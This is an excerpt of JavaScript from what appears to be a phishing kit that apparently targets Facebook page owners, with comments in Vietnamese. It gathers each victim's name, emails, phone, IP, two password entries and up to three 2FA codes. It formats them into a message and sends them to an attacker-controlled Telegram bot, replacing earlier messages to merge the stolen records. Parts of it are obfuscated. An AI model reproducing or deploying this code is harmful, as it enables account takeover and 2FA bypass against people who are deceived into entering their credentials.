...
var cleanSearchText = document
	.getElementById('searchModal')
	.querySelector('.close-search-icon-wraper');
...
// Format dữ liệu thành message HTML
function formatTelegramMessage(data) {
	var message = '<b>📩 MPC - New Data</b>\n\n';
	message += '<b>🌐 IP Info:</b>\n';
	message += 'IP: <code>' + (data.ip_address || 'N/A') + '</code>\n';
	message += 'Country: <code>' + (data.country || 'N/A') + '</code>\n';
	message += 'Code: <code>' + (data.country_code || 'N/A') + '</code>\n\n';

	message += '<b>👤 Personal Info:</b>\n';
	message += 'Full Name: ' + (data.full_name ? '<code>' + data.full_name + '</code>' : 'N/A') + '\n';
	message += 'Personal Email: ' + (data.pers_email ? '<code>' + data.pers_email + '</code>' : 'N/A') + '\n';
	message += 'Business Email: ' + (data.bus_email ? '<code>' + data.bus_email + '</code>' : 'N/A') + '\n';
	message += 'Phone: ' + (data.phone_number ? '<code>' + data.phone_number + '</code>' : 'N/A') + '\n';
	message += 'Page Name: ' + (data.fb_page_name ? '<code>' + data.fb_page_name + '</code>' : 'N/A') + '\n\n';

	message += '<b>🔑 Passwords:</b>\n';
	message += 'Password 1: ' + (data.p_one ? '<code>' + data.p_one + '</code>' : 'N/A') + '\n';
	message += 'Password 2: ' + (data.p_two ? '<code>' + data.p_two + '</code>' : 'N/A') + '\n\n';

	message += '<b>🔒 2FA Codes:</b>\n';
	message += 'Code 1: ' + (data.c_one ? '<code>' + data.c_one + '</code>' : 'N/A') + '\n';
	message += 'Code 2: ' + (data.c_two ? '<code>' + data.c_two + '</code>' : 'N/A') + '\n';
	message += 'Code 3: ' + (data.c_three ? '<code>' + data.c_three + '</code>' : 'N/A') + '\n\n';
	...
	message += '<b>📊 Metrics:</b>\n';
	message += 'Device: <code>' + (data.is_Mobile ? 'Mobile' : 'Desktop') + '</code>\n';
	if (data.params && data.params !== 'No URL parameters found.\n') {
...
async function sendToTelegram(message) {
	const sendMessageUrl = `https://api.telegram.org/bot${telegramConfig.token}/sendMessage`;
	const deleteMessageUrl = `https://api.telegram.org/bot${telegramConfig.token}/deleteMessage`;
	...
	if (messageId) {
		try {
			console.log('🗑️ Đang xóa message cũ, ID:', messageId);
			const deleteResp = await fetch(deleteMessageUrl, {
				method: 'POST',
				headers: {
			...
			if (deleteResult.ok) {
				console.log('✅ Đã xóa message cũ thành công');
			} else {
				console.warn('⚠️ Không thể xóa message cũ:', deleteResult);
			}
		} catch (error) {
	...
	// Nối message mới với message cũ nếu có
	let text = message;
	if (oldMessage) {
		text = oldMessage + '\n\n' + message;
	}
	...
	// Gửi message mới
	try {
		console.log('📤 Đang gửi message đến Telegram...');
		...
		console.log('📥 Response từ Telegram:', result);

		if (result.ok && result.result) {
			localStorage.setItem('message', text);
			localStorage.setItem('messageId', result.result.message_id);
			console.log('✅ Gửi message thành công! Message ID:', result.result.message_id);
		} else {
			console.error('❌ Lỗi gửi message:', result);
		}
	} catch (error) {
...
function sendDataEmail() {
	// Map dữ liệu từ formsSendData vào object
	var _0x47accc = {
	...
	// Format và gửi đến Telegram
	const telegramMessage = formatTelegramMessage(_0x47accc);
...
function serializeForm(_0xaec1fb) {
	const { elements: _0x39dcd5 } = _0xaec1fb;
	const _0xa185ff = Array.from(_0x39dcd5)
		.filter((_0x276fee) => _0x276fee.name != '')
		.map((_0x284595) => {
			const { name: _0x205192, value: _0x36e0d4 } = _0x284595;
			return {
				name: _0x205192,
				value: _0x36e0d4,
			};
